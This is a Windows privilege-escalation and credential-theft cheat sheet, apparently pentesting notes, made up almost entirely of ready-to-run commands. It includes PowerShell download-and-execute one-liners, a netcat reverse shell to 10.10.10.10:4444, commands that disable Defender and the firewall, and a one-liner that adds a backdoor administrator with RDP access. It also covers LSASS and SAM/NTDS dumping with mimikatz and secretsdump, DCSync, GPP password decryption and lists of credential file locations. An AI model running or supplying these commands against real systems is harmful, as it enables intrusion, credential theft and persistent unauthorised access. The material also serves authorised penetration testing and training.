# Tools
* [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)
```
# Enumeration
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"

# automatic exploit
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
```
* [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
* [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
```
* [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
* [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
```
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
```
* [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
* [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
* [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
* [Seatbelt - A C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)
```
Seatbelt.exe -group=all -full
Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
```
* [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
* [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
```
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```
* [winPEAS - Windows Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
```
winpeas.exe
```
* [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)
```
# First obtain systeminfo
systeminfo
systeminfo > systeminfo.txt
# Then feed it to wesng
python3 wes.py --update-wes
python3 wes.py --update
python3 wes.py systeminfo.txt
```
* [PrivescCheck - Privilege Escalation Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,H
```
# Import modules
 ## PowerSploit
The default PowerShell module paths are listed in the $Env:PSModulePath environment variable.

The default per-user module path is: "$Env:HomeDrive$Env:HOMEPATH\\Documents\\WindowsPowerShell\\Modules" The default computer-level module path is: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\Modules"
### PowerView
To install this module, drop the entire Recon folder into one of your module directories. 
To use the module, type `Import-Module Recon`
To see the commands imported, type `Get-Command -Module Recon`
### PowerUp
To install this module, drop the entire Privesc folder into one of your module directories.
To use the module, type `Import-Module Privesc`
To see the commands imported, type `Get-Command -Module Privesc`
# Windows Initial Checks
## Basic Info
### Basic commands
Host version:
```
hostname
systeminfo
systeminfo | findstr /b /C:"OS Name" /C"OS Version"
[System.Environment]::OSVersion.Version #Current OS version
```
Extract patchs and updates:
```
wmic qfe
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
Architecture:
```
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```
List all env variables
```
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
Detect non-ssl WSUS updates:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
## Blind files
```
C:\Windows\System32\license.rtf
C:\Windows\System32\eula.txt
```
## Powershell
If the following command doesn't work, assume it's powershell 1.0.
```
powershell -Command "$PSVersionTable.PSVersion"
```
## AV Enumeration
AV State:
```
# Check registry
sc query windefend

# check status of Defender
Get-MpComputerStatus
```
Disable AV:
```
# disable scanning all downloaded files and attachments, disable AMSI (reactive)
Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
Set-MpPreference -DisableIOAVProtection $true

# disable AMSI (set to 0 to enable)
Set-MpPreference -DisableScriptScanning 1 

# exclude a folder
Add-MpPreference -ExclusionPath "C:\Temp"
Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"

# remove signatures (if Internet connection is present, they will be downloaded again):
& "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Network Info
### Network Details
Interfaces, IP and DNS:
```
ipconfig /all  
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
Routing table:
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
ARP table:
```
arp -A  
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
hosts file:
```
type C:\Windows\System32\drivers\etc\hosts
```
Current connections:
```
netstat -ano
net stat
```
Network shares:
```
mmc.exe
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
powershell Find-DomainShare -ComputerDomain domain.local
```
SNMP configuration:
```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
### Firewall  
Firewall state and current configuration:
```
netsh firewall show state  
netsh firewall show config  
netsh advfirewall firewall dump
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```
Firewall's blocked ports:
```
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
```
Disable firewall:
```
# Disable Firewall on Windows 7 via cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable Firewall on Windows 7 via Powershell
powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`

# Disable Firewall on any windows via cmd
netsh firewall set opmode disable
netsh Advfirewall set allprofiles state off

# How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop" 

# Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed

# Enable Remote assistance:
reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

# Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable
```
### Network capture
```
tcpdump -D
WinDump.exe
```
## Users and Groups
### Info about current user 
```
echo %USERNAME%  
echo %USERNAME% || whoami
$env:username
net user %USERNAME%
whoami
whoami /priv
whoami /groups
```
List privileges:
```
secedit /export /areas USER_RIGHTS /cfg OUTFILE.CFG
```
### Local
List all Local Users:
```
net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
List all Local Groups:
```
net localgroup  
```
Check who is a member of the local group "Administrators":
```
net localgroup Administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
# CVEs
## Patch Level  
```
wmic qfe get Caption, Description
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
## Applications
```
wmic product get name, version, vendor
```
##  Device Drivers and Kernel Modules
```
wmic logicaldisk get Caption
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername

driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
driverquery.exe /fo table /si
DriverQuery.exe --no-msft

Get-WmiObject Win32\_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$\_.DeviceName -like "\*VMware\*"}

Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
# Sensitive data
## Show Unmounted Disks
```
mountvol

mountvol c:\\test \\\?\\Volume{93131ba8-0000-0000-0000-100000000000}\
```
## Passwords in memory
### cmdkey
```
winPEASany.exe quiet cmd windowscreds
```
\*If there are entries, it means that we may able to runas certain user who stored his cred in windows\* 
```
cmdkey /list 
```
### WIFI 
Find AP SSID:
```
netsh wlan show profile
```
Get cleartext passwords:
```
netsh wlan show profile <SSID> key=clear
```
Onliner for all AP:
```
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
### Powershell logging
```
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### LSASS or  FTP, etc. (SeDebug)
Dump the lsass.exe process to a file using Windows built-in Task Manager with right-clicking “lsass.exe” then selecting “Create Dump File” (since Vista) or [Procdump](http://technet.microsoft.com/en-au/sysinternals/dd996900.aspx)(pre Vista) – alternatively, use [powershell-fu](https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) , etc. (see [carnal0wnage](http://carnal0wnage.attackresearch.com/2013/07/mimikatz-minidump-and-mimikatz-via-bat.html) blog):
```
# Taskmanager
Right click -> Create dump file

# Procdump
procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1
// or avoid reading lsass by dumping a cloned lsass process
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp

#comsvcs.dll
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full

# ProcessDump from cisco jabber
cd c:\program files (x86)\cisco systems\cisco jabber\x64\
processdump.exe (ps lsass).id c:\temp\lsass.dmp
```
Then dump the credentials offline using mimikatz and its minidump module:
```
mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit
```
## Passwords in files
```
winPEASany.exe quiet cmd searchfast filesinfo
```
### Alternate data stream
```
Get-Item -path flag.txt -Stream *
Get-Content -path flag.txt -Stream Flag
```
### SAM Files
```
%SYSTEMROOT%\\repair\\SAM  
%SYSTEMROOT%\\System32\\config\\RegBack\\SAM  
%SYSTEMROOT%\\System32\\config\\SAM  
%SYSTEMROOT%\\repair\\system  
%SYSTEMROOT%\\System32\\config\\SYSTEM  
%SYSTEMROOT%\\System32\\config\\RegBack\\system  
```
Generate a hash file for john:
```
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
```
### Powershell history
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Powershell transcript
```
type C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
type C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt

#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### IIS Web Config
Find configuration files:
```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Look for default locations:
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\inetpub\wwwroot\web.config
```
### Common files to check
```
c:\\sysprep.inf  
c:\\sysprep\\sysprep.xml  
c:\\unattend.xml
C:\\Windows\\Panther\\Unattend.xml
C:\\Windows\\Panther\\Unattend\\Unattend.xml
%WINDIR%\\Panther\\Unattend\\Unattended.xml  
%WINDIR%\\Panther\\Unattended.xml
C:\Windows\system32\sysprep.inf 
C:\Windows\system32\sysprep\sysprep.xml

# Display the content of these files
dir /s \*sysprep.inf \*sysprep.xml \*unattended.xml \*unattend.xml *unattend.txt 2>nul
dir /b /s web.config  
dir /b /s \*pass\*  

dir c:\\*vnc.ini /s /b  
dir c:\\*ultravnc.ini /s /b   
dir c:\ /s /b | findstr /si *vnc.ini  

%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\iis6.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\System32\config\sam
%WINDIR%\System32\config\RegBack\sam
%WINDIR%\System32\config\system
%WINDIR%\System32\config\RegBack\system
%WINDIR%\System32\config\sam.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\CCM\logs\*.log
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
C:\\Users\\<user>\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_*\\LocalState\\plum.sqlite
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%USERPROFILE%\\AppData\\Roaming\\FileZilla\\sitemanager.xml
%USERPROFILE%\\Documents\\SuperPuTTY\\Sessions.xml
%USERPROFILE%\.aws\credentials
%USERPROFILE%\AppData\Roaming\gcloud\credentials.db
%USERPROFILE%\AppData\Roaming\gcloud\legacy_credentials
%USERPROFILE%\AppData\Roaming\gcloud\access_tokens.db
%USERPROFILE%\.azure\accessTokens.json
%USERPROFILE%\.azure\azureProfile.json


*.gpg
*.pgp
\*config\*.php
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
*.kdbx
FreeSSHDservice.ini
access.log
error.log
server.xml
setupinfo
setupinfo.bak
tomcat-users.xml # tomcat
elasticsearch.y*ml # elasctic
kibana.y*ml # kibana
KeePass.config # keepass
key3.db #Firefox
key4.db #Firefox
places.sqlite #Firefox
"Login Data"   #Chrome
Cookies #Chrome
Bookmarks #Chrome
History #Chrome
TypedURLsTime #IE
TypedURLs #IE
SiteList.xml # McAfee Site list
```
### Raw text search
```
# Search for files with a certain filename
dir /s \*pass\* == \*cred\* == \*vnc\* == *.config*  
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini

# Search for keywords in files 
findstr /si password *.xml *.ini *.txt
findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
findstr /si pass/pwd *.ini 
```
## Passwords in Registry
```
winPEASany.exe quiet filesinfo userinfo
```
### SAM / LSA secrets (SeBackup)
```
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save

esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
```
#### Kali VM
```
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
### VNC  
```
reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
reg query "HKCU\\Software\\TightVNC\\Server"  
```
### Windows autologin  
```
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"  
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
```
### SNMP Paramters  
```
reg query "HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP"  
```
### Putty  
```
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"  
```
SSH Keys:
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
If you find any entry inside that path it will probably be a saved SSH key. It is stored encrypted but can be easily decrypted using [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows_sshagent_extract). More information about this technique here: https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/ 
### LDAP
```
reg query "HKLM\\Software\\Policies\\Microsoft Services\\AdmPwd"
```
### WinSCP
```
reg query "HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions""
```
### RDP
```
reg query "HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\"
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers\"
```
RDP credential manager:
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz**   `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files** You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module
### Key manager (GUI)
```
rundll32 keymgr,KRShowKeyMgr
```
### Windows Data Protection API 
**DPAPI allows developers to encrypt keys using a symmetric key derived from the user's logon secrets**, or in the case of system encryption, using the system's domain authentication secrets.

The DPAPI keys used for encrypting the user's RSA keys are stored under `%APPDATA%\Microsoft\Protect\{SID}` directory, where {SID} is the [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) of that user. **The DPAPI key is stored in the same file as the master key that protects the users private keys**. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it using`dir` from the cmd, but you can list it from PS).
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
You can use **mimikatz module**   dpapi::masterkey with the appropriate arguments (`/pvk` or `/rpc`) to decrypt it.
The **credentials files protected by the master password** are usually located in:
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module**   `dpapi::cred` with the appropiate `/masterkey` to decrypt. You can **extract many DPAPI**   **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).
See: [Reading DPAPI Encrypted Secrets with Mimikatz and C++ - Red Teaming Experiments (ired.team)](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++)

Otherwise, dump passwords with [Netpass](http://www.nirsoft.net/utils/network_password_recovery.html):
```
netpass.exe
```
### IE/Outlook/MSN
Dump passwords with [Protected Storage PassView](http://www.nirsoft.net/utils/pspv.html):
```
pspv.exe
```
NirSoft offers many [tools](http://nirsoft.net/utils/index.html#password_utils) to recover passwords stored by third-party software.
### OpenVPN
```
reg query "HKCU\Software\OpenVPN-GUI\configs"
```
### Raw text search
```
reg query HKLM /f password /t REG_SZ /s  
reg query HKCU /f password /t REG_SZ /s  
REG QUERY HKLM /F "password" /t REG_SZ /S /K 
REG QUERY HKCU /F "password" /t REG_SZ /S /K
```
### Domain Controllers
#### GPP
Browse shares on the domain controller for passwords in Group Policy Preferences (GPP) that can be [decrypted](http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html):
```
findstr /S cpassword \\dc1.securus.corp.com\sysvol\*.xml \\192.168.122.55\sysvol\securus.corp.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml: ="" description="" cpassword="1MJPOM4MqvDWWJq5IY9nJqeUHMMt6N2CUtb7B/jRFPs" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="1" subAuthority="RID_ADMIN" userName="Administrator (built-in)"/>
```
Search in `C:\ProgramData\Microsoft\Group Policy\history` or in **_C:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\Group Policy\\history_** _(previous to W Vista)_ for these files:
* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

Decrypt the passwords:
```
ruby gppdecrypt.rb 1MJPOM4MqvDWWJq5IY9nJqeUHMMt6N2CUtb7B/jRFPs1q2w3e4r5t
gpp-decrypt <hash>
```
####  Dump hashes from DC (SeBackUp)
##### Get sensitive files
Try to list shadow copies:
```
# ntdsutil
ntdsutil
snqapshot
activate instance NTDS
list all

# vssadmin
vssadmin list shadows
  
# diskshadow
diskshadow list shadows all

# vssown
cscript vssown.vbs /start
cscript vssown.vbs /list

## Powersploit
Import-Module .\\VolumeShadowCopyTools.ps1
Get-VolumeShadowCopy
```
Try to create a shadow copy:
```
# ntdsutil
ntdsutil
activate instance ntds
ifm
create full C:\ntdsutil
quit
quit

# vssadmin
vssadmin create shadow /for=C: 2>&1

# diskshadow
diskshadow.exe /s c:\diskshadow.txt
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %someAlias%
reset

# vssown
cscript vssown.vbs /start
cscript vssown.vbs /create c

# Powersploit
Import-Module .\VolumeShadowCopyTools.ps1
New-VolumeShadowCopy -Volume C:\
```
Get shadow copy:
```
# Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

# Or copy the ntds, sam and system files directly from the sadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp 2>&1
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM\ C:\temp 2>&1
```
Automate:
```
# Nishang
Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\
```
##### Dump hashes
```
secretsdump.py -system system.save -ntds ntds.dit LOCAL
```
##### Automate 
```
# fgdump
fgdump.exe

# Impacket
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.0
```
####  DCsync
Need **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-Al**l rights on the domain.
Retrieve most users who can perform DC replication for dev.testlab.local:
```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```
Replicate database:
```
#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

#DCsync using secretsdump.py from impacket with NTLM authentication
secretsdump.py <user>:<password>@<ipaddress> -just-dc

#DCsync using secretsdump.py from impacket with Kerberos Authentication
secretsdump.py -no-pass -k <Domain>/<Username>@<DCIPorFQDN> -just-dc-ntlm
```
**Tip:**   
/ptt -> inject ticket on current running session  
/ticket -> save the ticket on the system for later use

#### DirSync
Need **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-In-Filtered-Set** on the domain.
As presented [here](https://simondotsh.com/infosec/2022/07/11/dirsync.html).
```
Import-Module ./DirSync.psm1

#Sync all the LAPS passwords in the domain
Sync-LAPS

#Sync a specific LAPS password
Sync-LAPS -LDAPFilter '(samaccountname=<computer$>)'

#Sync confidential attributs
Sync-Attributes -LDAPFilter '(samaccountname=user1)' -Attributes unixUserPassword,description
```

####  DCshadow

# Misconfigurations 
## Global path
If any part of the SYSTEM %PATH% variable is writeable by Authenticated Users, privesc exists. Many applications don't use full path. If system32 is not first entry in path this is bad.

Check PATH:
```
reg query HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment
$env:Path
```
Check permissions of all folders inside PATH:
```
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
## Find Readable/Writable Files and Directories
```
accesschk.exe -uws "Everyone" "C:\\Program Files"

Get-ChildItem "C:\\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\\sAllow\\s\\sModify"}
```
## Find named pipes
Find named pipes: 
```
[System.IO.Directory]::GetFiles("\\.\pipe\")
```
Check named pipes DACL:
```
pipesec.exe <named_pipe>
```
Use reverse engineering software to find the good payload.
Send data throught the named pipe :
```
program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe`
```
## Scheduled Tasks  
```
# MMC snaps-ins
mmc.exe
taskschd.msc

# schtsaks
schtasks /query /fo LIST
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM

# powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

# File System
dir c:\\windows\\tasks\  
dir c:\\windows\\system32\\tasks\  

# Info on specific task
schtasks /query /v /fo list /tn "\\System Maintenance"
```
## Startup tasks
```
winPEASany.exe quiet applicationsinfo
```
```
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```
## Privileges 
### AlwaysInstallElevated
```
winPEASany.exe quiet windowscreds
```
If 64 bits use:  %SystemRoot%\\Sysnative\\reg.exe:
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
```
PowerUp:
```
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Get-RegistryAlwaysInstallElevated"
```
## Active process and services
```
winPEASany.exe quiet procesinfo
winPEASany.exe quiet servicesinfo
```
### Find vulnerable process
Get running processes:
```
tasklist /v
Get-Process
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
get-process | where-object {$_.mainwindowtitle -ne ""} | Select-Object mainwindowtitle
